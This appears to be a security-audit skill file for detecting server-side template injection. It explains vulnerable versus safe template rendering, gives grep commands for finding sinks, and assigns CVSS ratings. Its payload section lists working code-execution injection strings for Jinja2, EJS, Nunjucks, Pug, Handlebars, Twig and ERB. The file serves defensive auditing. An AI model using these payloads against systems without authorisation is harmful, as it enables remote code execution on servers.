---
name: ssti
description: "Detect Server-Side Template Injection where user input is passed as the template string itself rather than as template variables, enabling code execution."
metadata:
  filePattern:
    - "**/*.js"
    - "**/*.ts"
    - "**/*.py"
    - "**/*.rb"
    - "**/*.php"
  bashPattern:
    - "grep.*(render|template|compile|Handlebars|nunjucks|ejs|Jinja)"
  priority: 85
---

# SSTI Detection

## When to Use

Audit template engines, email template systems, report generators, CMS systems, and any code that compiles templates from user input.

## Key Distinction

- User input **IN the template string** = VULNERABLE (SSTI)
- User input **IN template variables/context** = SAFE (this is normal template usage)

```js
// VULNERABLE: user input IS the template
ejs.render(userInput, data);

// SAFE: user input is in the data, not the template
ejs.render(templateFromFile, { name: userInput });
```

**Auto-escaping does NOT help.** Auto-escaping prevents XSS in template OUTPUT, not code execution in template COMPILATION.

## Process

### Step 1: Find Template Compilation

```
# JavaScript
grep -rn "Handlebars\.compile\|nunjucks\.renderString\|ejs\.render" .
grep -rn "pug\.compile\|pug\.render\|mustache\.render" .
grep -rn "template(\|compile(\|render(" . | grep -v node_modules

# Python
grep -rn "Template(\|from_string\|render_template_string" .
grep -rn "Jinja2\|jinja2\|Environment\|render_string" .
grep -rn "mako\.template\|Mako\|Template(" .

# Ruby
grep -rn "ERB\.new\|Erubi\|Slim\|Haml" .

# PHP
grep -rn "Twig.*createTemplate\|Twig.*Environment\|Blade\|Smarty" .
```

### Step 2: Check if First Argument is User-Controlled

For each template compilation call:
1. Is the template string hardcoded or loaded from a file? (SAFE)
2. Is the template string from user input? (VULNERABLE)
3. Is the template string from a database but originally user-supplied? (VULNERABLE)

### Step 3: Check for Sandbox Mode

Some template engines have sandboxed modes:
```
grep -rn "SandboxedEnvironment\|sandbox\|restricted" .
```

Jinja2 SandboxedEnvironment restricts attribute access but may still be bypassable.

## Engine-Specific Payloads

### Detection Payload (Universal)
```
{{7*7}}
```
If output contains `49`, template injection confirmed.

### Jinja2 (Python)
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### EJS (JavaScript)
```
<%= require('child_process').execSync('id') %>
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

### Nunjucks (JavaScript)
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### Pug (JavaScript)
```
#{global.process.mainModule.require('child_process').execSync('id')}
```

### Handlebars (JavaScript)
Harder to exploit in modern versions. Check for helper registration:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### ERB (Ruby)
```
<%= system('id') %>
<%= `id` %>
```

## CVSS Guidance

- SSTI to RCE (unauthenticated): CRITICAL 9.8
- SSTI to RCE (authenticated, low-priv): HIGH 8.8
- SSTI with sandboxed engine: HIGH 7.5 (sandbox bypass may exist)
- SSTI in client-side template (XSS only): MEDIUM 6.1

## References

- [Sinks](references/sinks.md) -- Template compilation functions
- [False Positive Indicators](references/false-positive-indicators.md)
- [PoC Skeleton](references/poc-skeleton.md)
